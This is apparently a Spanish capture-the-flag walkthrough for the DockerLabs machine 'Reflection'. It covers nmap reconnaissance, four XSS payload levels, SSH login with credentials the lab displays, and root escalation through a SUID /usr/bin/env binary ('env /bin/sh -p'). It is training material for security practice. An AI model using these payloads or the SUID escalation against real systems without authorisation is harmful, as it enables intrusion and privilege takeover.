# Máquina: Reflection — DockerLabs

**Dificultad:** Fácil  
**SO:** Debian Linux  
**IP objetivo:** `172.17.0.2`  
**Tipo:** Bug Bounty  
**Técnicas:** XSS (4 tipos) · SUID env exploitation

---

## Flujo del ataque

```
Nmap (SSH + HTTP) → 4 laboratorios XSS (progresivos)
→ Lab1 (Reflected) → Lab2 (Stored) → Lab3 (URL encoding)
→ Lab4 (GET params) → SSH (balu:balulero) → SUID env → root
```

---

## 1. Reconocimiento

### Ping

```bash
ping -c 4 172.17.0.2
```

```
4 packets transmitted, 4 received, 0% packet loss
```

TTL = 64 → Sistema Linux confirmado.

### Nmap

```bash
nmap -sS -sC -sV -p- --min-rate 5000 -n -Pn -vvv -oN scan 172.17.0.2
```

| Puerto | Estado | Servicio | Versión                    |
|--------|--------|----------|----------------------------|
| 22/tcp | open   | SSH      | OpenSSH 9.2p1 Debian       |
| 80/tcp | open   | HTTP     | Apache httpd 2.4.62 Debian |

---

## 2. Página principal — 4 Laboratorios de XSS

La página principal anuncia un **"Laboratorio de Cross-Site Scripting (XSS)"** con cuatro niveles progresivos:

1. Reflected XSS
2. Stored XSS
3. XSS con Dropdowns
4. XSS Basado en Parámetros GET

---

## 3. Laboratorio 1 — XSS Reflected

Un formulario simple acepta entrada de usuario y la refleja sin sanitización.

### Payload básico

```html
<img src='1' onerror='alert(0)' >
```

- `src='1'` intenta cargar imagen inexistente
- `onerror` se dispara al fallar la carga
- `alert(0)` ejecuta alerta

**Laboratorio 1 completado** — XSS Reflected confirmado.

---

## 4. Laboratorio 2 — XSS Stored

Similar a Lab 1 pero el servidor **almacena** el payload en base de datos. Cada carga de página lo ejecuta.

Mismo payload:

```html
<img src='1' onerror='alert(0)' >
```

**Diferencia:** El alert aparece **cada vez** que se recarga, afectando a **todos los usuarios**.

**Laboratorio 2 completado** — XSS Stored confirmado.

---

## 5. Laboratorio 3 — XSS con URL encoding

Formulario con tres dropdowns. El servidor rechaza caracteres especiales sin codificar.

### URL encoding del payload

```
<img src='1' onerror='alert(0)' >
↓
%3c%69%6d%67%20%73%72%63%3d%27%31%27%20%6f%6e%65%72%72%6f%72%3d%27%61%6c%65%72%74%28%30%29%27%20%3e
```

### Inyección en parámetro GET

```bash
curl "http://172.17.0.2/laboratorio3/?opcion1=ValorA&opcion2=%3c%69%6d%67%20%73%72%63%3d%27%31%27%20%6f%6e%65%72%72%6f%72%3d%27%61%6c%65%72%74%28%30%29%27%20%3e&opcion3=Opcion1"
```

O en el navegador:

```
http://172.17.0.2/laboratorio3/?opcion1=ValorA&opcion2=%3c%69%6d%67%20%73%72%63%3d%27%31%27%20%6f%6e%65%72%72%6f%72%3d%27%61%6c%65%72%74%28%30%29%27%20%3e&opcion3=Opcion1
```

El servidor decodifica y ejecuta sin sanitización.

**Laboratorio 3 completado** — XSS via URL encoding confirmado.

---

## 6. Laboratorio 4 — XSS en parámetros GET

Un endpoint que acepta parámetro `data` en la URL.

### Inyección directa

```bash
curl "http://172.17.0.2/laboratorio4/?data=%3Cimg%20src=%271%27%20onerror=%27alert(0)%27%20%3E"
```

O en el navegador:

```
http://172.17.0.2/laboratorio4/?data=%3Cimg%20src=%271%27%20onerror=%27alert(0)%27%20%3E
```

**Laboratorio 4 completado** — XSS en parámetros GET confirmado.

---

## 7. Acceso SSH — balu:balulero

Con laboratorios completados, la página muestra credenciales:

```
Usuario: balu
Password: balulero
```

```bash
ssh balu@172.17.0.2
# Password: balulero
```

---

## 8. Escalada de privilegios — SUID env

```bash
find / -perm -4000 -type f 2>/dev/null | xargs ls -la
```

```
-rwsr-xr-x 1 root root 48536 Sep 20  2022 /usr/bin/env
```

Referencia: [GTFOBins — env](https://gtfobins.github.io/gtfobins/env/)

```bash
env /bin/sh -p
```

```
# id
uid=1000(balu) gid=1000(balu) euid=0(root) groups=1000(balu),100(users)

# whoami
root
```

---

## Credenciales

| Usuario | Contraseña | Método                |
|---------|------------|----------------------|
| balu    | balulero   | Página principal      |
| root    | —          | SUID /usr/bin/env -p  |

---

## Referencias

- [OWASP — Cross Site Scripting (XSS)](https://owasp.org/www-community/attacks/xss/)
- [GTFOBins — env](https://gtfobins.github.io/gtfobins/env/)
- [PortSwigger — XSS](https://portswigger.net/web-security/cross-site-scripting)
